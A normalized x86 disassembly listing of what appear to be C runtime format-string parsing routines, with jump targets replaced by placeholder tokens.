mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4264cd
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4267d5
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_434be6
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426848
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a049
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push ebx
push [ edi ]
call sub_434be6
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
jmp r-xdata
mov [ edi ] r--data
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
pop ebx
sub_4268c4
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_434be6
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426937
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_434be6
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_4269aa
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a0c7
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push ebx
push [ edi ]
call sub_434be6
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
jmp r-xdata
mov [ edi ] r--data
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
pop ebx
sub_426a26
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_434be6
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426a99
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_426de9
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426b0d
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a145
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0x0
push ebx
mov ecx esi
call sub_426e29
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
pop ecx
pop ecx
jmp r-xdata
mov [ edi ] r--data
mov [ esi + 0x38 ] eax
pop ebx
sub_426b8b
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_426e69
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426bff
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_426ea9
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426c73
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a1c3
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f310
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0x0
push ebx
mov ecx esi
call sub_426ee9
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
pop ecx
pop ecx
jmp r-xdata
mov [ edi ] r--data
mov [ esi + 0x38 ] eax
pop ebx
sub_426cf1
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_426f29
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_434d0d
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426de9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426e29
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426e69
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426ea9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426ee9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426f29
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_427125
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434140
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov eax edx
sub_4271db
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434140
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov eax edx
sub_427291
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434260
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov eax edx
sub_427348
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434260
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov eax edx
sub_42743f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434140
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov eax edx
sub_4274f5
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434140
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov eax edx
sub_4275ab
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434260
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov eax edx
sub_427662
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_434260
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov eax edx
sub_4277cb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41da34
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov al [ ebp + 0x10 ]
mov [ edx + 0x4 ] al
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_427816
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41db62
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov al [ ebp + 0x10 ]
mov [ edx + 0x4 ] al
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_427861
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41dc90
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x4 ] ax
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_4278ae
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41ddb3
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x4 ] ax
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_4278fb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
cmp al 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp al 0x30
jl r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_434140
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x1 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp al 0x39
jg r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434140
add esp 0xc
test eax eax
jle r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
cmp [ edx ] 0x24
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x24
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40de60
add esp 0xc
